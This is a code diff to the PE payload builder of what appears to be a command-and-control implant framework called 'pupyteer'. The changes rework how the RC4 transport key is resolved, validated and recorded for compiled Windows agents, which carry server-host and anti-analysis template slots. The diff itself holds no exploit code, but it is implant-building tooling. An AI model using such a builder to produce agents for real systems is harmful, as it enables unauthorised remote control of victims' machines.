@@ -26,6 +26,7 @@ from datetime import datetime, timezone
 from pathlib import Path
 from typing import Any, Dict, Optional
 
+from pupyteer._proc import creationflags
 from pupyteer.agent.core.stub import StubConfig
 
 logger = logging.getLogger("pupyteer.payloads.pe_builder")
@@ -44,10 +45,12 @@ TEMPLATE_PLACEHOLDERS = (
     "{{RC4KEY}}", "{{ANTI_ANALYSIS}}",
 )
 
-# Default RC4 transport key when the StubConfig does not supply one.
-# 8 hex digits (4 bytes) — deliberately weak by default; operators must set
-# payloads.pe_rc4_key or StubConfig.rc4_key to something real.
-DEFAULT_PE_RC4_KEY = ""  # unset -> build generates a random key
+# RC4 transport key when nothing configures one. Empty is the plaintext wire,
+# which is what the listener defaults to as well; see PEBuilder._resolve_rc4_key.
+DEFAULT_PE_RC4_KEY = ""
+
+#: A hex key the C agent can parse: whole bytes, nothing else.
+_HEX_KEY_RE = re.compile(r"^(?:[0-9a-fA-F]{2})+$")
 
 #: Rendered into a C string literal, so anything that could end the literal
 #: early or start an escape has to be refused rather than compiled in.
@@ -75,6 +78,10 @@ class PEBuildResult:
     size_bytes: int = 0
     build_timestamp: str = ""
     compiler_used: str = ""
+    #: RC4 transport key compiled in, as hex. Empty means the plaintext wire.
+    #: Recorded so a build can be checked against the listener's own
+    #: `transports.rc4_key` without scraping the log.
+    rc4_key: str = ""
 
     def to_dict(self) -> Dict[str, Any]:
         return {
@@ -85,6 +92,7 @@ class PEBuildResult:
             "size_bytes": self.size_bytes,
             "build_timestamp": self.build_timestamp,
             "compiler_used": self.compiler_used,
+            "rc4_key": self.rc4_key,
         }
 
 
@@ -156,6 +164,7 @@ class PEBuilder:
             template = self._load_template()
 
             # 3. Render C source
+            result.rc4_key = self._resolve_rc4_key(stub_cfg)
             source = self._render(template, stub_cfg)
 
             # 4. Write temp .c file
@@ -258,6 +267,46 @@ class PEBuilder:
             raise FileNotFoundError(f"PE template not found: {tpl}")
         return tpl.read_text(encoding="utf-8")
 
+    def _resolve_rc4_key(self, cfg: StubConfig) -> str:
+        """The RC4 transport key this build carries, as hex. Empty means off.
+
+        Precedence: StubConfig.rc4_key > StubConfig.dns_key >
+        config payloads.pe_rc4_key > config transports.rc4_key > off.
+
+        Unset means *off*, never "invent one". The listener's own default is
+        the plaintext wire, and the two sides read different config keys, so a
+        key generated at build time and written nowhere produced a payload that
+        could never register — the operator's only clue was a log line naming a
+        value that was persisted in no file they could read. Reading
+        `transports.rc4_key` as a fallback lets one config key drive both ends.
+
+        A non-hex key is refused rather than ignored: the C agent silently
+        degrades to plaintext when its key fails to parse, so accepting one
+        here would compile a payload that looks framed on the wire and is not.
+        """
+        key = getattr(cfg, "rc4_key", "") or ""
+        if not key:
+            key = getattr(cfg, "dns_key", "") or ""
+        if not key:
+            key = self._config.get("payloads.pe_rc4_key", "") or ""
+        if not key:
+            key = self._config.get("transports.rc4_key", "") or ""
+        key = str(key).strip()
+        if key and not _HEX_KEY_RE.match(key):
+            raise ValueError(
+                f"RC4 transport key {key!r} is not a hex string; the compiled "
+                "agent would fall back to a plaintext wire while this build "
+                "log said the channel was framed"
+            )
+        if not key:
+            logger.warning(
+                "RC4 transport obfuscation is OFF — no key configured, so this "
+                "payload speaks plaintext JSON under TLS. Set "
+                "payloads.pe_rc4_key, and the same value as "
+                "transports.rc4_key on the listener, to enable it."
+            )
+        return key
+
     def _render(self, template: str, cfg: StubConfig) -> str:
         """Fill the template from the build config, or refuse to build.
 
@@ -276,30 +325,9 @@ class PEBuilder:
                 f"{cfg.name or 'this'}'s build settings, and building it anyway "
                 "would produce an agent the listener refuses")
 
-        # RC4 transport key. Precedence: StubConfig.rc4_key > StubConfig.dns_key
-        # > config payloads.pe_rc4_key > built-in default. ConfigManager.get()
-        # returns its default only when the key is genuinely absent, so a None
-        # default cleanly distinguishes "unset" from "set to deadbeef". Empty is
-        # legitimate: it selects the plaintext wire (no RC4 framing).
-        if hasattr(cfg, "rc4_key"):
-            rc4_key = getattr(cfg, "rc4_key", "")
-        else:
-            rc4_key = getattr(cfg, "dns_key", "")
-        if rc4_key is None:
-            rc4_key = self._config.get("payloads.pe_rc4_key", None) or ""
-        if rc4_key is None:
-            rc4_key = ""
-        # Never ship the historical weak default ("deadbeef"). When no key is
-        # configured, generate a strong random key and surface it so the
-        # operator can configure the matching listener.
-        _UNSET = object()
-        _cfg_val = self._config.get("payloads.pe_rc4_key", _UNSET)
-        if rc4_key == "" and _cfg_val is _UNSET:
-            import secrets as _sec
-            rc4_key = _sec.token_hex(16)
-            logger.warning(
-                "No RC4 key configured; generated random key %r — configure "
-                "listener with the same value", rc4_key)
+        # RC4 transport key, resolved once so the rendered source and the build
+        # record cannot disagree about what was compiled in.
+        rc4_key = self._resolve_rc4_key(cfg)
 
         replacements = {
             "{{HOST}}": self._c_string("server host", cfg.host or "127.0.0.1"),
@@ -402,6 +430,7 @@ class PEBuilder:
                 capture_output=True,
                 text=True,
                 timeout=60,
+                creationflags=creationflags(),
             )
             if proc.returncode != 0:
                 err = proc.stderr.strip() or proc.stdout.strip() or f"exit {proc.returncode}"
